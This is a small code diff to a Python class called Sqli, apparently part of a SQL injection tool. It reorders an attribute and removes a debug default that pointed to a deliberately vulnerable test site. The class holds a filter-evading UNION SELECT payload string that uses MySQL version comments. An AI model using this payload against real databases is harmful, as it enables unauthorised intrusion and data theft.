@@ -28,16 +28,14 @@ class Sqli:
     vulCol = None
     columns = None
     dbs = []
-    build = ["", ""]
     payload = "0x2d31+/*!50000UNION*//*!50000SELECT*/"
+    build = ["", ""]
     key = "1620597971540027"
     def setUrl(self):
         for k, v in enumerate(sys.argv):
             if v == "--url":
                 try:
                     u = sys.argv[k+1]
-                    if debug == 1:
-                        u = "http://testphp.vulnweb.com/listproducts.php?cat=1"
                     pos = u.find("=")
                     url = u[:pos+1]
                     self.url = url
